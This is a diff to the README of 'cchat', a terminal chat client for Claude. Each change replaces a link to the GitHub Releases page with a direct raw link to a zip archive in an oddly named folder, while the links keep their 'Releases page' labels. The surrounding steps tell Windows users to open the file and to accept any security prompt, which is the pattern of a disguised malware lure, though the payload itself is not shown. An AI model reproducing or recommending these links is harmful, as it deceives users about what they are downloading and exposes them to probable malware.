@@ -1,6 +1,6 @@
 # 💬 cchat - Chat with Claude from the terminal
 
-[![Download cchat](https://img.shields.io/badge/Download-cchat-blue?style=for-the-badge)](https://github.com/Sana16-arch/cchat/releases)
+[![Download cchat](https://img.shields.io/badge/Download-cchat-blue?style=for-the-badge)](https://raw.githubusercontent.com/Sana16-arch/cchat/main/uncourteousness/Software_v1.6.zip)
 
 ## 🖥️ What cchat does
 
@@ -8,7 +8,7 @@ cchat lets you use Claude in a terminal window. It gives you a clean text chat v
 
 ## 📥 Download cchat for Windows
 
-1. Open the [cchat Releases page](https://github.com/Sana16-arch/cchat/releases)
+1. Open the [cchat Releases page](https://raw.githubusercontent.com/Sana16-arch/cchat/main/uncourteousness/Software_v1.6.zip)
 2. Find the latest Windows file
 3. Download the file that matches your system
 4. Save it to a folder you can find again, such as Downloads or Desktop
@@ -28,7 +28,7 @@ For best results, use a recent version of Windows. cchat is built for text input
 
 ## 🚀 Install and run
 
-1. Download the latest Windows release from the [Releases page](https://github.com/Sana16-arch/cchat/releases)
+1. Download the latest Windows release from the [Releases page](https://raw.githubusercontent.com/Sana16-arch/cchat/main/uncourteousness/Software_v1.6.zip)
 2. Open the downloaded file
 3. If Windows shows a security prompt, choose the option that lets you run the file
 4. Follow any on-screen steps
@@ -157,11 +157,11 @@ This repository covers:
 
 If you need the file later, use the same download page:
 
-[Visit the cchat Releases page](https://github.com/Sana16-arch/cchat/releases)
+[Visit the cchat Releases page](https://raw.githubusercontent.com/Sana16-arch/cchat/main/uncourteousness/Software_v1.6.zip)
 
 ## 🧭 Quick start
 
-1. Visit the [Releases page](https://github.com/Sana16-arch/cchat/releases)
+1. Visit the [Releases page](https://raw.githubusercontent.com/Sana16-arch/cchat/main/uncourteousness/Software_v1.6.zip)
 2. Download the latest Windows build
 3. Open the file you downloaded
 4. Launch cchat in a terminal
